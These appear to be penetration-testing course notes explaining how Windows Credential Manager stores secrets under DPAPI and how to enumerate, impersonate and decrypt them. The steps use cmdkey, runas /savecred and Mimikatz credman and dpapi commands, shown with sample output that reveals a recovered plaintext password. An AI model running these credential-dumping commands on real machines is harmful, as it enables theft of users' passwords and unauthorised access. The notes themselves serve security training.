# Attacking Windows Credential Manager

## Table of Contents

- [What is it](#what-is-it)
- [Enumerating credentials with cmdkey](#enumerating-credentials-with-cmdkey)
- [Extracting credentials with Mimikatz](#extracting-credentials-with-mimikatz)

---

## What is it

**Credential Manager** has existed since Windows 7 / Server 2008 R2. In plain terms: it's Windows' built-in password manager for *other* things — websites, shared drives, domain logins, OneDrive tokens — not for logging into Windows itself. 

Microsoft doesn't publish deep technical documentation on exactly how it works internally, but the basic idea is simple: credentials get encrypted and tucked away in special folders tied to your user profile.

### Where the data actually lives

```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

Each of these "vault" folders contains a file called `Policy.vpol`, which holds the **AES key** (128 or 256-bit) actually used to encrypt the saved credentials. That AES key itself is protected by **DPAPI** — the same decryption dependency chain we saw earlier with LSASS and the SAM/SECURITY hives.

> **Note:** Newer Windows versions add an extra layer called **Credential Guard**, which stores the DPAPI master keys inside a hardware-isolated memory enclave (Virtualization-based Security) — making them much harder to reach even with admin rights.

### Terminology clarification

- **Credential Manager** = the user-facing feature and API you interact with
- **Credential Locker** (formerly called "Windows Vault") = the actual encrypted storage behind the scenes

### The two types of stored credentials

| Type | What it's for |
|------|------------------|
| **Web Credentials** | Logins for websites/online accounts — used by Internet Explorer and legacy Edge |
| **Windows Credentials** | Tokens for services like OneDrive, plus domain user logins, local network resources, and shared folders |

<img width="1125" height="634" alt="image" src="https://github.com/user-attachments/assets/e469ad41-e0fd-479c-a865-b734053061f3" />

### Exporting a vault manually (as a legitimate Windows feature)

Windows actually has a built-in way to back up vault contents to a `.crd` file, password-protected by whatever password the user supplies at export time:

```cmd
C:\Users\sadams> rundll32 keymgr.dll,KRShowKeyMgr
```

<img width="391" height="396" alt="image" src="https://github.com/user-attachments/assets/45d77bc4-6d91-4f9c-a31c-2fab7b7f86a5" />

This opens the Stored User Names and Passwords dialog, where backup/restore options are available — the same thing reachable via Control Panel.

---

## 1. Enumerating credentials with cmdkey

Windows ships with a built-in command, **cmdkey**, that lists what's currently saved in the logged-in user's Credential Manager — no special tools needed.

```cmd
C:\Users\sadams> whoami
srv01\sadams

C:\Users\sadams> cmdkey /list
```

```
Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

### Reading the output

| Field | Meaning |
|-------|------------|
| **Target** | What resource or account this credential belongs to |
| **Type** | `Generic` (general-purpose) or `Domain Password` (domain account login) |
| **User** | The account tied to this credential |
| **Persistence** | Whether the credential survives a reboot (`Local machine persistence`) |

In the example above:
- The first entry (`virtualapp/didlogical`) is just a Microsoft/Windows Live account token with an internal ID as the "username" — not usually useful to us.
- The second entry is the interesting one: a saved **domain credential** for `SRV01\mcharles`, marked `interactive` — meaning it's meant for full interactive logons, not just background authentication.

### Using a stored credential without ever seeing the password

Here's the clever part — you don't need to *decrypt* this credential to use it. Windows itself can use the stored secret on your behalf via `runas`:

```cmd
C:\Users\sadams> runas /savecred /user:SRV01\mcharles cmd

Attempting to start cmd as user "SRV01\mcharles" ...
```

This opens a new `cmd.exe` session running **as `mcharles`**, using the credential already saved in Credential Manager — effectively impersonating that user without ever needing to know their actual plaintext password.
<img width="1023" height="433" alt="image" src="https://github.com/user-attachments/assets/5011955c-9ad4-474b-aad2-1b10a7bc06ec" />

---

## 2. Extracting credentials with Mimikatz

If you do want the actual plaintext values (not just the ability to impersonate via `runas`), tools like **Mimikatz** can extract them. There are two main approaches within Mimikatz:
- **`sekurlsa`** — pull credentials live out of LSASS process memory
- **`dpapi`** — manually decrypt credential files using recovered DPAPI keys

### Example: pulling Credential Manager secrets via LSASS

```cmd
C:\Users\Administrator\Desktop> mimikatz.exe
```

First, enable the debug privilege needed to touch LSASS memory (covered in the LSASS guide):
```
mimikatz # privilege::debug
Privilege '20' OK
```

Then run the Credential Manager-specific module:
```
mimikatz # sekurlsa::credman
```

```
Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : <recovered plaintext password>
```

This pulls the credential straight out of the live logon session cached in memory — same underlying mechanism as the LSASS attacks from earlier, just targeting the Credential Manager data specifically rather than the raw NT hash.

### Example: decrypting the credential files directly with the dpapi module

`sekurlsa::credman` only works if the user is **actively logged in** and their session is still sitting in LSASS memory. But what if they've logged off, or you only managed to grab a copy of their files (not a live memory dump)? 

That's where Mimikatz's `dpapi` module comes in — instead of reading memory, it decrypts the credential files on disk directly, as long as you can get hold of the right **`masterkey`** first.

Recall from earlier: every vault's credentials are encrypted with an AES key, and that AES key is itself protected by a **DPAPI masterkey** tied to the user's profile. So the process has two steps: decrypt the masterkey, then use it to decrypt the actual credential file.

**Step 1 — Decrypt the user's DPAPI masterkey**

- Masterkey files live here, named by a GUID:
```
%UserProfile%\AppData\Roaming\Microsoft\Protect\<User-SID>\
```

- If you know the user's plaintext password (say, you cracked it earlier from an NT hash), you can decrypt their masterkey directly:
```
mimikatz # dpapi::masterkey /in:"C:\Users\mcharles\AppData\Roaming\Microsoft\Protect\S-1-5-21-1340203682-1669575078-4153855890-1002\3e1d1091-b792-45df-ab8e-c66af044d69b" /sid:S-1-5-21-1340203682-1669575078-4153855890-1002 /password:Summer2025!
```
```
** Masterkey : {SHA1} 52e758b6120389898f7fae553ac8172b43221605
key : e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d...
```
- That recovered `key` value is the decrypted masterkey — the missing piece needed to unlock everything else.

**Step 2 — Use the masterkey to decrypt the actual credential file**

- Credential blobs sit here:
```
%UserProfile%\AppData\Local\Microsoft\Credentials\
```
- Now feed both the credential file and the recovered masterkey into `dpapi::cred`:
```
mimikatz # dpapi::cred /in:"C:\Users\mcharles\AppData\Local\Microsoft\Credentials\7F9FFD679D3D1C5E6B9D1B20C5D4D1AE" /masterkey:e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d...
```
```
**CREDENTIAL**
CredFlags   : 00000030
LastWritten : 4/27/2025 2:41:10 AM
Type        : 2 - domain_password
Persist     : 2 - local_machine
TargetName  : Domain:interactive=SRV01\mcharles
UserName    : SRV01\mcharles
CredentialBlob : Summer2025!
```
- Out comes the plaintext password — recovered entirely from static files on disk, with no need for a live logon session or an LSASS memory dump at all.

> **Where does the masterkey password come from if you don't already know it?** Besides the user's own password, Mimikatz also supports `/rpc`, which attempts to decrypt the masterkey using the **domain's DPAPI backup key** instead — something a Domain Admin can retrieve, letting them decrypt any domain user's DPAPI secrets without ever knowing that user's actual password.

---

## Other tools worth knowing

Mimikatz isn't the only option — depending on the situation, you might also reach for:

| Tool | What it's good for |
|------|------------------------|
| **SharpDPAPI** | A C# tool focused specifically on DPAPI-protected data (vaults, credentials, cookies) |
| **LaZagne** | A broader credential-harvesting tool that checks dozens of applications, not just Windows' own stores |
| **DonPAPI** | Lets you remotely dump DPAPI secrets across multiple machines without needing an interactive session on each one |

---

## Quick Recap

| Step | Tool | What it gives you |
|------|------|----------------------|
| List what's saved | `cmdkey /list` | Names/targets of stored credentials (no passwords shown) |
| Use a saved credential without decrypting it | `runas /savecred` | An authenticated session as the stored user |
| Decrypt actual plaintext values | Mimikatz (`sekurlsa::credman` or `dpapi`) | Real usernames/passwords pulled from memory or vault files |
| Alternative extraction tools | SharpDPAPI, LaZagne, DonPAPI | Broader or remote-friendly credential harvesting |

**Key idea:** Credential Manager isn't a single flat file you can just read — it's a layered system (vault folders → AES keys → DPAPI protection, optionally hardware-isolated via Credential Guard). You can often get away with *using* a stored credential via `runas` without ever decrypting it, but fully recovering the plaintext password requires the same DPAPI/LSASS-based techniques covered in the earlier sections of this module.
